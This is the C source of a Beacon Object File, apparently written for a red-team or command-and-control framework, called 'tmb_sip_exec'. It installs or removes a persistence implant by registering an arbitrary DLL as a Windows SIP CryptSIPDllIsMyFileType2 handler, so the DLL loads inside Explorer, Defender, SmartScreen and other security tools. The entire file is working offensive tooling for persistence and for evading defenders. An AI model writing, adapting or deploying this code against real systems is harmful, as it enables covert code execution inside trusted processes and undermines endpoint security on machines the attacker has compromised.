/*
 * tmb_sip_exec.c - SIP execution surface implant
 *
 * Registers a payload DLL as CryptSIPDllIsMyFileType2 handler.
 * The DLL loads in any process that calls WinVerifyTrust.
 *
 * Args: short action (0=install, 1=remove), char* dll_path, char* guid_or_alias
 */

#include "tmb_bof.h"

void go(char *args, int alen) {
    if (!tmb_init()) { TMB_ERR("Failed to resolve NT API."); return; }

    datap parser;
    BeaconDataParse(&parser, args, alen);
    short action = BeaconDataShort(&parser);
    int dll_len = 0, guid_len = 0;
    char *dll_path = BeaconDataExtract(&parser, &dll_len);
    char *guid_input = BeaconDataExtract(&parser, &guid_len);

    if (!guid_input || !*guid_input) {
        TMB_ERR("--guid is required. Aliases: pe, ps1, jscript, vbscript, wsf, cab, catalog, appx, msi, ctl, esd, sac");
        return;
    }

    const char *extensions = NULL;
    const wchar_t *resolved = tmb_resolve_alias(guid_input, &extensions);
    wchar_t wguid[64];
    if (resolved) {
        int i = 0;
        while (resolved[i] && i < 63) { wguid[i] = resolved[i]; i++; }
        wguid[i] = 0;
    } else {
        int i = 0;
        while (guid_input[i] && i < 63) { wguid[i] = (wchar_t)guid_input[i]; i++; }
        wguid[i] = 0;
        extensions = "(custom)";
    }

    wchar_t path[256];
    tmb_build_ismyfiletype_path(wguid, path);

    if (action == 0) {
        /* Install */
        if (!dll_path || !*dll_path) {
            TMB_ERR("--dll is required for install.");
            return;
        }
        wchar_t wdll[260];
        int i = 0;
        while (dll_path[i] && i < 259) { wdll[i] = (wchar_t)dll_path[i]; i++; }
        wdll[i] = 0;

        STR_ISMYFILETYPE2(func);
        if (tmb_reg_write_sip(path, wdll, func)) {
            TMB_OK("Implant installed on SIP execution surface.");
            TMB_INFO("  GUID:       %S (%s)", wguid, resolved ? guid_input : "raw");
            TMB_INFO("  Triggers:   %s", extensions);
            TMB_INFO("  Payload:    %s", dll_path);
            TMB_INFO("  Loads in:   Explorer, SmartScreen, Defender, certutil, signtool, AV");
            TMB_WARN("Log out and log back in to trigger in new processes.");
            TMB_INFO("Undo: tmb_sip_exec remove --guid %s", guid_input);
        } else {
            TMB_ERR("Failed to install implant. Verify admin privileges.");
        }
    } else {
        /* Remove */
        HANDLE hk = tmb_reg_open(path, FALSE);
        if (hk) {
            NTSTATUS s = tmb_reg_delete(hk);
            g_nt.pNtClose(hk);
            if (s == 0) {
                TMB_OK("Implant removed: %S", wguid);
            } else {
                TMB_NTERR("NtDeleteKey", s);
            }
        } else {
            TMB_ERR("Key not found or access denied.");
        }
    }
}
